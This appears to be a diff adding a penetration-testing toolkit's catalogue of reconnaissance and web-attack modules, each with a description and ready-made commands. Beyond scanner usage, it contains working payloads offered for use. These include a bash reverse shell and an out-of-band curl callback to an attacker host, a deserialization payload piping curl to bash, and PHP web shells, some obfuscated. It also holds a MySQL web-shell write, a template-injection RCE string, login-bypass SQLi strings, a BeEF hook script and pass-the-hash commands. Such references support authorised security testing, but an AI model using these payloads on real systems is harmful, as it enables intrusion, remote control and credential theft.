+    who can reach Domain Admin and how. Pre-built queries find Kerberoastable
+    users and dangerous ACL edges; each edge's help gives the abuse command.
+    The map you build the AD attack around.
+    • collect: bloodhound-python -d corp.local -u user -p pass -c All -ns <dc-ip>  (or SharpHound.exe -c All, or nxc --bloodhound)
+    • start: bloodhound (CE, docker compose) / legacy GUI + neo4j; drag the .zip / upload to import
+    • pre-built queries: "Shortest paths to Domain Admins", "Find Kerberoastable", "Dangerous ACL" edges
+    • right-click a node -> Mark as Owned / High Value; edge help shows the exact abuse command
+    • custom Cypher, e.g. MATCH p=shortestPath((u{owned:true})-[*1..]->(g:Group{name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p
+enum_pstools                     - Sysinternals PsTools - remote Windows host enumeration
+    Sysinternals PsTools run Windows administration remotely over SMB with
+    local-admin credentials: PsExec for a SYSTEM shell, PsLoggedon to see who
+    is signed in, PsService / PsList / PsKill for process and service control,
+    PsInfo and PsLogList for host details. Legitimate signed binaries - but
+    noisy (temp service + prefetch artefacts).
+    • psexec \\host -s cmd            SYSTEM shell over SMB (ADMIN$ + a temp service - noisy)
+    • psloggedon \\host  /  PsLoggedon64 -l -x        who is logged on (hunt for admins)
+    • psservice \\host query ; pslist \\host ; pskill \\host <pid> ; psexec -c -f payload.exe
+    • psinfo \\host  /  psloglist \\host system -d 1     host details and event logs remotely
+    • needs local-admin creds; -u / -p for alternate creds; leaves service + prefetch artefacts
+enum_adexplorer                  - Sysinternals AD Explorer - Active Directory browser
+    Sysinternals AD Explorer is a GUI Active Directory browser that can take
+    an offline snapshot of the entire directory. Browse or search it later
+    without generating repeated LDAP noise, compare two snapshots to see what
+    changed, and convert the .dat to BloodHound JSON. Read-only; no write
+    access needed.
+    • ADExplorer.exe /snapshot "" out.dat -> browse a live or snapshotted directory offline
+    • no write needed; grab the whole tree for later analysis without repeated LDAP noise
+    • Compare two snapshots to see what objects / attributes changed over time
+    • ADExplorerSnapshot.py converts the .dat into BloodHound JSON for ingest
+enum_arp                         - arp cache inspection for local-segment hosts
+    Reads the local ARP / neighbour cache (ip neigh, arp -a) to list hosts
+    already seen on the L2 segment, identify the gateway and spot appliances -
+    without sending a scan. Populate it quietly first with a ping sweep, then
+    read it. The stealthiest form of local discovery.
+    • ip neigh   (Linux)   /   arp -a   (all OSes)   - list hosts already talked to on this L2 segment
+    • map IP <-> MAC, identify the gateway, spot other clients and appliances without sending a scan
+    • populate it quietly first with fping -g -r0 <cidr> or nmap -sn, then read ip neigh
+enum_autorecon                   - AutoRecon - multi-threaded service enumeration
+    AutoRecon runs nmap discovery, then launches per-service enumeration
+    plugins (SMB, HTTP, DNS, SNMP, FTP and more) in parallel, writing all raw
+    output plus a commands log of suggested follow-ups per target. An
+    excellent unattended first pass that leaves you a structured directory to
+    work through.
+    • autorecon 10.0.0.5           or   autorecon -t targets.txt   /   autorecon 10.0.0.0/24
+    • runs nmap discovery, then per-service plugins (SMB, HTTP, DNS, SNMP, FTP, ...) in parallel
+    • output/<target>/: scans/ (all raw output), report/, and _commands.log with suggested follow-ups
+    • --nmap-append "--script-timeout 5m", --single-target, --heartbeat; great unattended first pass
+enum_enum4linux                  - enum4linux - SMB / NetBIOS Windows enumeration
+    enum4linux(-ng) wraps smbclient, rpcclient, net and nmblookup to enumerate
+    Windows/Samba hosts over SMB and NetBIOS - users, groups, shares, password
+    policy, OS and workgroup - including RID cycling when anonymous enum is
+    restricted. The -ng rewrite gives clean JSON/YAML output. A staple against
+    port 139/445.
+    • enum4linux-ng -A -u '' -p '' <host>       full run with a null session, JSON/YAML with -oJ/-oY
+    • wraps smbclient / rpcclient / net / nmblookup: users, groups, shares, password policy, OS, workgroup
+    • -r RID cycling to pull users when RestrictAnonymous blocks direct enum; -u user -p pass for authed
+    • classic enum4linux still ships; -ng is the maintained rewrite with cleaner, parseable output
+enum_masscan                     - masscan - internet-scale TCP port scanner
+    masscan is an asynchronous TCP port scanner fast enough to sweep large
+    ranges or the whole internet, using nmap-like syntax. You control the
+    packet rate (start low). It only finds open ports - pipe the results into
+    nmap -sV for version detection. Use it for the initial wide sweep, not for
+    detail.
+    • masscan 10.0.0.0/16 -p1-65535 --rate 10000 -oL out.txt        async, nmap-style syntax
+    • --rate packets/sec (start low - 1000; 100000+ can melt a link or the target), --wait 5 for late replies
+    • -p U:53,U:161 for UDP; --banners grabs banners; --excludefile scope-out.txt; --resume paused.conf
+    • feed the open ports to nmap -sV for depth: masscan ... | awk ... | nmap -iL -
+enum_mysql                       - MySQL client queries and enumeration
+    Notes and queries for interacting with a MySQL/MariaDB server once you
+    have credentials or an injection: dump user hashes and schema, read and
+    write files with LOAD_FILE / INTO OUTFILE (needs FILE privilege), and get
+    command execution via a user-defined function when the plugin directory is
+    writable.
+    • mysql -h <host> -u root -p'' -e 'SELECT version(); SHOW DATABASES;'    (add --ssl=0 for old servers)
+    • loot: SELECT user,authentication_string FROM mysql.user;  SELECT * FROM information_schema.tables;
+    • file read/write: SELECT LOAD_FILE('/etc/passwd');  SELECT '<?php system($_GET[0]);?>' INTO OUTFILE '/var/www/html/s.php';  (needs FILE priv + secure_file_priv unset)
+    • command exec: create a UDF (lib_mysqludf_sys) when the plugin dir is writable
+enum_nessus                      - Nessus vulnerability scanner setup notes
+    Setup and workflow notes for Nessus, a GUI/service vulnerability scanner
+    (not a CLI tool). Start the daemon, reach the web UI, build a policy, add
+    credentials for a much deeper credentialed scan, then export .nessus or
+    CSV for the report and for choosing which findings to exploit.
+    • systemctl start nessusd  ->  https://<host>:8834  (first run builds plugins, slow)
+    • create a policy (Basic / Advanced), add credentials for a much deeper credentialed scan
+    • launch a scan by target list; export as .nessus (XML) or CSV for the report and exploit selection
+    • setup / workflow notes only - Nessus itself is a service + web UI, not a CLI scanner
+enum_netsh                       - Windows netsh - interface, firewall and wlan config
+    Windows netsh configures interfaces, firewall and Wi-Fi from the command
+    line, and is useful post-exploitation: recover saved WLAN keys in
+    cleartext, add a portproxy for pivoting, open a firewall port, or capture
+    traffic to an ETL file without installing Wireshark.
+    • netsh wlan show profiles  ->  netsh wlan show profile name="SSID" key=clear     recover saved Wi-Fi keys
+    • pivot: netsh interface portproxy add v4tov4 listenport=3389 connectaddress=10.0.0.9 connectport=3389
+    • firewall: netsh advfirewall firewall add rule name=x dir=in action=allow protocol=tcp localport=4444
+    • capture without Wireshark: netsh trace start capture=yes tracefile=c:\t.etl  ->  stop  (open in netmon/etl2pcapng)
+enum_nmap                        - detailed nmap port / version / OS / vuln scanning
+    nmap is the core network scanner - host discovery, TCP/UDP port scanning,
+    service and version detection, OS fingerprinting, and the NSE script
+    engine for enumeration and vuln checks. Output in all formats with -oA.
+    Almost every engagement starts here; this module is the detailed flag and
+    NSE reference.
+    • discovery: nmap -sn 10.0.0.0/24        full TCP: nmap -p- --min-rate 2000 -T4 <host>
+    • deep: nmap -sVC -O -p<ports> -oA scan <host>   (-sC default scripts, -sV versions, -O OS)
+    • UDP top ports: nmap -sU --top-ports 100 <host>   ; -Pn skip host discovery when ICMP is filtered
+    • NSE: --script vuln  /  smb-enum-shares,smb-enum-users  /  http-title  /  --script-args ...
+    • -oA base writes .nmap/.gnmap/.xml; timing -T0..T5; -e <iface> --source-port 53 for egress tricks
+enum_nmblookup                   - nmblookup - NetBIOS name-table lookup
+    nmblookup does NetBIOS name-table lookups over UDP 137: dump a host's name
+    table to read its roles (workstation, file server, domain controller),
+    resolve a NetBIOS name to an IP, or find the segment's master browser and
+    workgroup. A quick legacy-Windows recon check.
+    • nmblookup -A <host>          dump the remote NetBIOS name table (roles: <00> workstation, <20> file server, <1c> DC)
+    • nmblookup <NAME>            resolve a NetBIOS name to IP over UDP 137
+    • nmblookup -M -- -            find the local master browser / workgroup on the segment
+enum_ping_sweep                  - fping / hping3 host discovery and Xmas scan
+    fping and hping3 for host discovery and low-level probing. fping sweeps a
+    CIDR and lists only live hosts; hping3 crafts individual ICMP/TCP/UDP
+    packets to probe a single port when ICMP is filtered, map firewall
+    behaviour by flag, or stress a target. Use fping for speed, hping3 for
+    control.
+    • fping -a -g 10.0.0.0/24 2>/dev/null        list only alive hosts (-a), generate range (-g)
+    • hping3 -1 <host>  ICMP  ;  -8 0-1000 -S <host>  SYN scan  ;  -2 UDP  ;  --flood -S for stress
+    • hping3 -S -p 80 -c 1 <host>  probe one TCP port when ICMP is filtered; craft flags for firewall mapping
+    • hping3 --scan 1-1000 -S <host>   quick built-in port scan mode
+enum_powerview                   - PowerView - Active Directory domain reconnaissance
+    PowerView is a PowerShell toolkit for Active Directory reconnaissance from
+    an unprivileged domain context, in memory. It enumerates domains, trusts,
+    users, SPNs and sessions, finds where your user is local admin, and
+    surfaces abusable ACL edges. The interactive complement to BloodHound's
+    graph.
+    • Get-Domain / Get-DomainController / Get-DomainTrust ; Get-DomainUser -SPN (Kerberoastable) ; Get-DomainUser -PreauthNotRequired (AS-REP)
+    • access: Find-LocalAdminAccess ; Find-DomainUserLocation ; Get-NetSession -ComputerName host
+    • ACL abuse: Find-InterestingDomainAcl -ResolveGUIDs ; Get-DomainObjectAcl -Identity user
+    • Get-DomainGPO / Get-DomainGPOLocalGroup ; runs in-memory from an unprivileged domain context (part of PowerSploit / dev branch)
+enum_seatbelt                    - Seatbelt - Windows host security survey
+    Seatbelt is a C# host-survey tool that runs dozens of Windows security
+    checks - credentials, tokens, UAC/LAPS/AV/AppLocker state, DPAPI, browser
+    data, RDP sessions, PowerShell history, scheduled tasks. Run all groups or
+    single checks; execute in memory via a C2's execute-assembly. Fast
+    situational awareness after landing on a host.
+    • Seatbelt.exe -group=all        run every check (or -group=user / system / remote / slack)
+    • Seatbelt.exe -group=all -outputfile=C:\s.txt   ; run via Cobalt/Sliver execute-assembly in memory
+    • surfaces: creds, tokens, UAC / LAPS / AV / AppLocker / LSA, DPAPI, browser data, RDP sessions, PS history, scheduled tasks, WEF
+    • individual checks e.g. Seatbelt.exe TokenPrivileges Certificates DpapiMasterKeys
+enum_smb_null_session            - SMB null-session enumeration technique
+    A technique reference for SMB null-session enumeration - connecting with
+    empty credentials via rpcclient, smbclient, smbmap, nxc or enum4linux-ng
+    to pull users, groups, shares and password policy. Works where
+    RestrictAnonymous is 0, still common on legacy and appliance SMB.
+    • rpcclient -U '' -N <host>   ->   enumdomusers / querydominfo / getdompwinfo / lsaquery
+    • smbclient -N -L //<host>    list shares with no credentials; smbmap -H <host> -u '' -p ''
+    • nxc smb <host> -u '' -p '' --users --shares --pass-pol   ; enum4linux-ng -u '' -p '' -A <host>
+    • works on hosts with RestrictAnonymous=0; often still open on legacy / appliance SMB
+enum_smb_shares                  - hidden-share and SMB protocol reference
+    A reference on SMB dialects, signing/encryption, and share types - admin
+    shares (C$, ADMIN$, IPC$), hidden user shares, and how to hunt writable
+    shares and interesting content (scripts, configs, KeePass files,
+    unattend.xml, .git). Use it to plan share enumeration and spidering.
+    • dialects: SMB1 (avoid), SMB2.x, SMB3 (encryption / signing); check with nxc smb <host>
+    • admin shares: C$ ADMIN$ IPC$ (require local admin); user-created $ shares are just hidden, not protected
+    • hunt writable shares: nxc smb <host> -u u -p p --shares  (READ,WRITE) ; smbmap -R for recursive listing
+    • interesting content: scripts, xml/config, *.kdbx, unattend.xml, web.config, .git; spider with smbclient / nxc -M spider_plus
+enum_smbclient                   - smbclient - list and access SMB shares
+    smbclient is the ftp-style command-line SMB client: list shares with a
+    null session or credentials, browse and get/put files interactively,
+    pass-the-hash, or recursively pull an entire share in one command. The
+    go-to for hands-on interaction with a specific share.
+    • smbclient -L //<host> -N                 list shares (null session)
+    • smbclient //<host>/share -U 'DOM\user%Pass'      interactive: ls, get, put, mget, recurse ON, prompt OFF
+    • pass-the-hash: smbclient //<host>/C$ -U user --pw-nt-hash <NThash>
+    • grab a whole share: smbclient //<host>/share -N -c 'recurse ON; prompt OFF; mget *'   or -Tc backup.tar
+enum_snmpwalk                    - snmpwalk - SNMP information gathering
+    Enumerates SNMP (UDP 161). Find the community string first with
+    onesixtyone, then snmpwalk the tree - or targeted OIDs for Windows users,
+    running processes and listening ports. snmp-check gives a tidy summary.
+    Write access plus NET-SNMP-EXTEND-MIB can mean command execution.
+    • onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <host>   find the string first
+    • snmpwalk -v2c -c public <host>                     walk everything (slow)
+    • snmpwalk -v2c -c public <host> 1.3.6.1.4.1.77.1.2.25   Windows users; hrSWRunName processes; udpLocalPort / tcpConnState ports
+    • snmp-check <host> -c public   nice summary; write access + NET-SNMP-EXTEND-MIB can give command exec
+enum_trivy                       - Trivy - offline vuln / secret / misconfig / licence scanner
+    Trivy is a single static binary that reads an artefact you already hold -
+    a pulled image, a source tree, a git repo, a mounted rootfs, a VM disk or
+    IaC files - and reports CVEs, hard-coded secrets, misconfigurations and
+    licences. It is READ-ONLY and offline against the target (findings come
+    from a downloaded DB), so it is the one vuln scanner here you can run over
+    loot without touching the client network. Targets: image / fs / repo /
+    rootfs / config / vm / sbom / k8s. Scanners: vuln,secret,misconfig,license.
+    • trivy image --severity HIGH,CRITICAL --ignore-unfixed nginx     package CVEs worth reporting and patchable
+    • trivy fs --scanners vuln,secret,misconfig,license /loot/src     everything, over an exfiltrated tree
+    • trivy repo https://github.com/client/app                        shallow clone, scan the tree for creds, discard - NO git history (that is OSIN_gitleaks)
+    • trivy rootfs /mnt/victim   ;   trivy config ./deploy            a mounted disk  ;  Dockerfile / k8s / Terraform / Helm
+    • report: --format json|sarif|cyclonedx -o file ; --exit-code 1 for a CI gate ; fixed-version = the remediation
+    • secret scan silently skips .md files and any test / example / vendor path - a real blind spot on a loot sweep, grep it yourself too
+    • first run pulls the DB (~1.3 GB cache under /root as root); add --skip-version-check --disable-telemetry on-engagement
+
+WEB ###########################################################################################
+
+web_arjun                        - Arjun - HTTP query / body / JSON parameter discovery
+    Arjun discovers hidden HTTP parameters - query, body, JSON or XML - that
+    an endpoint accepts but does not document, using chunked requests and
+    response diffing against a large name list. Feed the parameters it finds
+    into tests for IDOR, injection, debug flags and mass assignment.
+    • arjun -u https://target/api/item -m GET           (-m GET/POST/JSON/XML request method)
+    • diff-based detection with chunked requests; -w custom param list, -oJ out.json, -t 10 threads
+    • --stable for flaky targets, --headers 'Cookie: ...', -d 2 delay, --passive pull params from CT/wayback
+    • feed hits to test IDOR, injection, debug flags, mass assignment
+web_badsecrets                   - badsecrets - detect known / crackable framework secrets
+    badsecrets detects and cracks known or weak framework signing secrets -
+    ASP.NET ViewState MAC keys, Flask/Django/Rails secret keys, Express
+    session cookies, weak JWT HMAC. Point it at a token or URL; on a hit you
+    can forge signed data, and an ASP.NET key leads to ViewState RCE via
+    ysoserial.net.
+    • badsecrets 'eyJ...'  /  badsecrets -u https://target      identify then crack a signing secret
+    • ASP.NET ViewState MAC key, Flask/Django/Rails secret_key, Express cookie-session, JWT weak HMAC, Symfony
+    • on a hit: badsecrets --custom-secret <key> to forge; ASP.NET key -> ysoserial.net ViewState RCE
+web_ssrf_gopherus                - SSRF exploitation - Gopherus gopher:// payloads + SSRF tricks
+    Gopherus builds gopher:// payloads that turn a Server-Side Request Forgery
+    into a concrete internal action - MySQL/Postgres/Redis/FastCGI/SMTP
+    commands. Paste its URL into the SSRF sink to reach cloud metadata, hit
+    internal services, or chain Redis to cron RCE. Also a reference for SSRF
+    filter bypasses.
+    • gopherus --exploit mysql / postgresql / redis / fastcgi / smtp / zabbix    prints a gopher:// URL
+    • paste that URL into the SSRF sink to run an internal action (Redis -> cron RCE, FastCGI -> PHP exec)
+    • cloud metadata: http://169.254.169.254/latest/meta-data/ (AWS IMDSv1), GCP needs Metadata-Flavor: Google
+    • bypasses: http://127.0.0.1 -> http://127.1, decimal/octal IPs, [::1], 2xx open redirect, DNS rebinding
+web_ssti                         - Server-Side Template Injection - SSTImap / tplmap
+    Tools and payloads for Server-Side Template Injection. Probe with
+    {{7*7}}-style expressions; a rendered 49 confirms it. SSTImap fingerprints
+    the engine (Jinja2, Twig, Freemarker, ERB and others) and then automates a
+    shell, OS command execution or file download. Includes manual RCE payloads
+    per engine.
+    • probe with ${7*7} {{7*7}} <%= 7*7 %> #{7*7}  - a rendered 49 confirms it
+    • sstimap -u 'https://target/?name=*'  ->  fingerprints engine, then -S (shell) / -X (os cmd) / -D remote local (download)
+    • engines: Jinja2, Twig, Freemarker, Velocity, ERB, Smarty, Mako, Handlebars, Pug
+    • Jinja2 RCE: {{cycler.__init__.__globals__.os.popen('id').read()}}
+web_ffuf                         - ffuf / feroxbuster - fast web content and parameter fuzzing
+    ffuf (and feroxbuster) is a fast web fuzzer for content discovery, virtual
+    hosts, and parameter/value brute force via a FUZZ keyword placed anywhere
+    in the request. Auto-calibration and rich filters (by status, size, words,
+    lines, regex) cut the noise. The workhorse for directory and endpoint
+    enumeration.
+    • dirs: ffuf -w list.txt -u https://target/FUZZ -e .php,.txt -mc 200,204,301,302,307,401,403 -o out.json
+    • auto-filter noise: -ac  (or -fs <size> / -fc 404 / -fw <words> / -fl <lines> / -fr <regex>)
+    • vhost: ffuf -w subs.txt -u https://target -H 'Host: FUZZ.target.com' -fs 0
+    • POST param: ffuf -w list.txt -X POST -d 'user=admin&pass=FUZZ' -H 'Content-Type: ...' -u https://target/login -fr 'invalid'
+    • -recursion -recursion-depth 2, -mode clusterbomb with W1/W2, -p 0.1 delay, -rate 200, -replay-proxy for Burp
+    • feroxbuster -u https://target -w list.txt -x php,txt -d 3 --extract-links   (recursive by default, auto-filter)
+web_graphql                      - GraphQL testing - graphw00f / graphql-cop / introspection
+    Tests GraphQL endpoints: graphw00f detects and fingerprints the engine,
+    introspection (or clairvoyance when it is disabled) recovers the schema,
+    and graphql-cop checks for batching, field suggestions and CSRF. Abuse
+    aliased batched queries to bypass rate limits and brute logins; nested
+    queries for DoS.
+    • graphw00f -d -f -t https://target/graphql        detect the endpoint, fingerprint the engine
+    • introspection: POST {"query":"{__schema{types{name fields{name}}}}"}  ; if disabled, use clairvoyance to infer it
+    • graphql-cop -t https://target/graphql -o json     batching, field suggestions, CSRF, alias-based DoS
+    • abuse: aliased batched queries to brute logins / bypass rate limits; nested queries for DoS; IDOR via node(id:)
+web_jwt_tool                     - jwt_tool - JSON Web Token analysis and attacks
+    jwt_tool decodes JSON Web Tokens, flags weak configurations,
+    dictionary-cracks HS256 secrets, and runs signature attacks - alg:none,
+    RS-to-HS key confusion, kid injection (SQLi / path traversal) - and can
+    tamper a claim and re-sign. Point it at a live endpoint with -M pb to run
+    the whole playbook.
+    • jwt_tool <token>                       decode header/payload/signature and flag issues
+    • jwt_tool <token> -C -d rockyou.txt     dictionary-crack an HS256 secret
+    • jwt_tool <token> -X a                   alg:none  ;  -X k -pk public.pem  RS->HS key confusion
+    • jwt_tool <token> -I -pc name -pv admin  tamper a claim then re-sign; -X i inject kid SQLi, -X s kid path traversal
+    • -t https://target/api -rh 'Authorization: Bearer ...' -M pb   run the whole playbook against a live endpoint
+web_nuclei                       - Nuclei - template-based vulnerability and misconfig scanner
+    Nuclei scans URLs against thousands of community YAML templates for known
+    CVEs, misconfigurations and exposures, filterable by severity, tag or ID.
+    Fast, low false-positive, and pipeline-friendly (subfinder | httpx |
+    nuclei). Update templates first. The standard 'known-issues' web scanner.
+    • nuclei -u https://target                or   nuclei -l hosts.txt -o out.txt
+    • filter: -severity critical,high  -tags cve,rce,exposure  -id <template-id>  -exclude-tags dos,intrusive
+    • -t custom/ run your own YAML; -nt new templates only; -as automatic web-scan; -rl 150 rate, -c 50 concurrency
+    • -json -o out.json for parsing; -H 'header'; -proxy http://127.0.0.1:8080; nuclei -update-templates first
+    • pairs with httpx: subfinder -d t.com | httpx -silent | nuclei -severity high
+web_ysoserial                    - ysoserial / ysoserial.net - deserialization gadget-chain payloads
+    ysoserial (Java) and ysoserial.net (.NET) generate serialized gadget-chain
+    payloads that execute code when an unsafe deserializer processes them.
+    Pick a chain that matches the app's libraries and drop the blob into the
+    sink - RMI/JMX, HTTP body, cookie, ViewState. URLDNS just proves the bug.
+    • Java: java -jar ysoserial.jar CommonsCollections6 'curl x/|bash' > payload.bin   (also URLDNS to just prove it)
+    • .NET: ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c 'calc' -o base64
+    • ViewState: ysoserial.exe -p ViewState -g ... --generator=<__VIEWSTATEGENERATOR> --validationkey=<key> --validationalg=SHA1
+    • drop the blob into the sink: RMI/JMX, HTTP body, cookie, ViewState, JSON with type hints; pick the chain from the app's libs
+web_auth_bypass                  - authentication / login bypass payload list
+    A payload and technique list for getting past a login: SQLi auth strings,
+    default credentials, forced browsing to /admin, response tampering, HTTP
+    verb and header tricks (X-Original-URL, X-Forwarded-For), and JWT/session
+    flaws. A checklist to work through against an authentication boundary.
+    • SQLi auth strings: ' or 1=1-- -   admin'-- -   ' or ''='   ")) or (("a"="a
+    • default creds (admin:admin, tomcat:s3cret, root:root); forced browsing straight to /admin
+    • response tampering (302->200, false->true), HTTP verb swap, X-Original-URL / X-Rewrite-URL / X-Forwarded-For 127.0.0.1
+    • JWT alg:none, session fixation, 2FA-step skip, password-reset token reuse
+web_beef                         - BeEF - Browser Exploitation Framework
+    BeEF, the Browser Exploitation Framework, hooks a victim browser via an
+    XSS-delivered script and drives it from a web UI - steal cookies,
+    screenshot, keylog, fake dialogs, port-scan the internal network, tunnel
+    HTTP through the browser. Use it to demonstrate real impact from an XSS
+    finding.
+    • ./beef -x   then hook a browser with <script src="http://you:3000/hook.js"></script> via XSS
+    • UI on :3000/ui/panel (default beef:beef); hooked browsers show under "Online Browsers"
+    • command modules: get cookies, screenshot, keylog, fake dialogs, port scan / ping sweep from the browser, tunneling proxy
+    • RESTful API for automation; msf bridge to launch browser exploits
+web_command_injection            - OS command-injection payloads and tricks
+    Payloads and tricks for OS command injection - shell metacharacter
+    separators, blind detection via time delay or out-of-band callback, and
+    filter bypasses (${IFS}, quoting, wildcards, base64-decode-pipe-bash).
+    Includes reverse-shell one-liners for when you confirm execution.
+    • separators: ; | & && || `cmd` $(cmd) %0a (newline) ; wrap: a) $(cmd) (b
+    • blind: time - ; sleep 5   / OOB - ; curl http://you/$(id|base64)   or nslookup `whoami`.you
+    • filter bypass: ${IFS} for spaces, w'h'oami quoting, /???/c?t wildcards, base64 -d|bash, $@ noise
+    • reverse shell: ;bash -c 'bash -i >& /dev/tcp/you/443 0>&1'
+web_dirb                         - dirb - web content / directory brute force
+    dirb is a simple, dependable web content and directory brute-forcer with
+    built-in wordlists. Slower and less flexible than ffuf or feroxbuster, but
+    a reliable low-tech fallback when those are not available.
+    • dirb https://target /usr/share/wordlists/dirb/common.txt -o out.txt
+    • -X .php,.bak extensions, -c 'COOKIE' auth, -p proxy, -H 'header', -r non-recursive, -z 100 ms delay, -S silent
+    • dependable low-tech fallback when ffuf / gobuster / feroxbuster aren't available
+web_download_page                - download a URL's raw content to the working dir
+    Fetches a URL's raw response body into the working directory - no
+    rendering, no link-following, just curl with a browser user-agent. Use it
+    to keep an offline copy of a page, an inline script, a JS bundle or an
+    exposed config file for review.
+    • fetches a URL's raw response body into /opt/SKELETON/working/ (no rendering, no link-following)
+    • keep an offline copy of a page, inline script, JS bundle or exposed config for review
+    • equivalent to: curl -sk -A 'Mozilla/5.0' -o working/page.html <url>
+web_eyewitness                   - EyeWitness - bulk web-service screenshots
+    EyeWitness takes bulk screenshots of web services from a URL list or an
+    nmap/Nessus file, then builds an HTML report that groups similar pages,
+    fingerprints the tech and flags likely default-credential logins. The
+    fastest way to triage hundreds of web hosts by eye. gowitness and aquatone
+    are alternatives.
+    • eyewitness --web -f urls.txt -d out/ --no-prompt        (also -x nmap.xml / --nessus)
+    • --timeout 20, --threads 10, --proxy-ip/-port, --add-http-ports 8080,8443
+    • report.html groups similar pages, fingerprints tech, flags likely default-cred logins
+    • gowitness / aquatone are drop-in alternatives (gowitness scan file -f urls.txt)
+web_gobuster                     - gobuster - directory, vhost and DNS brute force
+    gobuster brute-forces directories and files, DNS subdomains, and virtual
+    hosts (plus S3/GCS/TFTP modes) - fast, Go-native, wordlist-driven. Similar
+    role to ffuf; some testers prefer its simpler output. The dns mode does
+    subdomain discovery without touching a web server.
+    • dir: gobuster dir -u https://target -w list.txt -x php,txt,html -t 50 -k -o out.txt -b 404,403
+    • dns: gobuster dns -d target.com -w subs.txt -t 50 -i        (subdomain discovery, no web server hit)
+    • vhost: gobuster vhost -u https://target -w subs.txt --append-domain --exclude-length 0
+    • other modes: fuzz (FUZZ keyword), s3, gcs, tftp; -c cookies, -H header, -P proxy, -s/-b status include/exclude
+web_grab_cookie                  - grab Set-Cookie / session values from a site
+    Retrieves a site's Set-Cookie headers with curl and helps you inspect the
+    security flags (HttpOnly, Secure, SameSite, Domain, Path, expiry) and
+    baseline the session token's length, charset and entropy before testing
+    for fixation or predictability.
+    • curl -skI https://target | grep -i set-cookie        or full: curl -skv https://target 2>&1 | grep -i '< set-cookie'
+    • inspect flags: HttpOnly, Secure, SameSite=Lax/Strict/None, Domain, Path, Max-Age / Expires
+    • baseline the token (length, charset, entropy, does it change per request) before testing fixation / prediction
+web_header_grabbing              - HTTP response-header / banner grabbing
+    Dumps HTTP response headers with curl to fingerprint the stack - Server,
+    X-Powered-By, framework version headers, caching, WAF signatures - and to
+    note missing security headers (CSP, HSTS, X-Frame-Options). Compare HEAD
+    vs GET and valid vs 404 for inconsistencies. httpx does it in bulk.
+    • curl -skID - https://target        dump response headers (and follow with -L)
+    • look for: Server, X-Powered-By, X-AspNet-Version, Via, X-Cache, Set-Cookie, CSP/HSTS/X-Frame-Options (or their absence), WAF fingerprints
+    • compare HEAD vs GET, / vs /nonexistent, http vs https for inconsistencies and stack leaks
+    • httpx -sc -title -server -tech-detect -l hosts.txt for bulk
+web_http_get                     - HTTP GET / method reference
+    A reference for HTTP methods and curl request-crafting: list allowed verbs
+    with OPTIONS, try verb tampering (HEAD/PUT/DELETE/TRACE and invented
+    verbs) to bypass method-based access rules, and the curl flags for
+    headers, cookies, proxies and host overrides.
+    • curl -sk -X OPTIONS -i https://target/        list Allow: verbs
+    • verb tampering: try HEAD/PUT/DELETE/PATCH/TRACE and made-up verbs to bypass auth on GET/POST-only rules
+    • curl knobs: -G --data-urlencode 'q=..', -H, -b/-c cookie jar, -e referer, -x proxy, --path-as-is, --resolve host:port:ip
+    • TRACE/TRACK enabled -> possible Cross-Site Tracing
+web_http_put                     - HTTP PUT method file-upload abuse
+    Checks for and abuses the HTTP PUT method, which lets you upload a file
+    directly to the web root - an instant web shell on misconfigured Tomcat
+    (readonly=false), IIS WebDAV or Apache DAV. Includes nmap and
+    davtest/cadaver approaches for WebDAV.
+    • curl -sk -X OPTIONS -i https://target/path/   -> if PUT in Allow:  curl -sk -X PUT https://target/path/s.jsp --data-binary @s.jsp
+    • nmap --script http-put --script-args http-put.url=/dav/s.php,http-put.file=s.php <host>
+    • WebDAV: davtest -url https://target/dav   then cadaver https://target/dav  (put, move to a runnable extension)
+    • common on misconfigured Tomcat (readonly=false), IIS WebDAV, Apache DAV
+web_php_shell                    - PHP web-shell one-liners
+    A collection of PHP web-shell one-liners, from the obvious system($_GET)
+    to harder-to-spot obfuscated variants, plus notes on planting them via
+    upload bypass, LFI with log poisoning, HTTP PUT or SQLi INTO OUTFILE, and
+    upgrading to a reverse shell.
+    • <?php system($_GET['c']); ?>    /   <?=`$_GET[0]`?>   /   <?php eval($_REQUEST['x']); ?>
+    • harder-to-spot: <?php $f='sys'.'tem'; $f($_GET['c']); ?> ; assert / preg_replace /e (old) / create_function
+    • usage: curl 'https://target/s.php?c=id'  ->  then upgrade to a reverse shell
+    • plant via upload bypass, LFI+log poisoning, PUT, or SQLi INTO OUTFILE
+web_recon_notes                  - web application recon and testing notes
+    A methodology checklist for web-application recon: fingerprint the stack,
+    read robots.txt / sitemap / .well-known, crawl for endpoints and secrets
+    in JavaScript, check for exposed .git/.env/backups, map the auth model and
+    roles, and catalogue every input. Drives which targeted tests to run next.
+    • fingerprint (whatweb / wappalyzer), read robots.txt, sitemap.xml, /.well-known/, security.txt
+    • crawl for endpoints + secrets in JS (katana, gau, LinkFinder, nuclei -tags exposure); check /.git /.svn /.env backups
+    • map auth model, roles, session handling; catalogue every input (params, headers, cookies, file upload, JSON keys)
+    • note the tech stack -> pick targeted tests (ViewState, deserialisation, SSTI, ORM, GraphQL, SSRF)
+web_shell_upload                 - web-shell upload and usage notes
+    Notes on defeating file-upload restrictions - alternate PHP extensions,
+    double extensions, null bytes, magic-byte and Content-Type spoofing,
+    uploading .htaccess or web.config to make an allowed extension execute,
+    and path traversal in the filename. Pairs with the PHP web-shell module.
+    • extension: shell.phtml / .phar / .pHp5 / shell.php.jpg / shell.php%00.jpg (old) / trailing dot or space
+    • content: add GIF89a; magic bytes then <?php ...; keep a valid image header; fix Content-Type to image/png
+    • server config: upload .htaccess (AddType application/x-httpd-php .jpg) or web.config to make an allowed ext execute
+    • path traversal in the filename (../), archive-extract path escape, race the AV/rename window
+web_sqlmap                       - sqlmap - automated SQL-injection exploitation
+    sqlmap automates finding and exploiting SQL injection: it detects the
+    injection and DBMS, then enumerates databases and dumps tables, reads and
+    writes files, and can pop an OS shell where the DBMS and privileges allow.
+    Feed it a saved Burp request; tamper scripts and proxy options handle
+    WAFs.
+    • sqlmap -r req.txt --batch                (save the request from Burp; --batch = non-interactive)
+    • sqlmap -u 'https://t/i?id=1' -p id --dbs --level 3 --risk 2 --random-agent
+    • enumerate: --current-user --is-dba --dbs -> -D db --tables -> -D db -T users --dump  (--dump-all, -C col1,col2)
+    • access: --file-read=/etc/passwd  --file-write local --file-dest remote  --os-shell  --os-pwn (needs stacked queries / DBA)
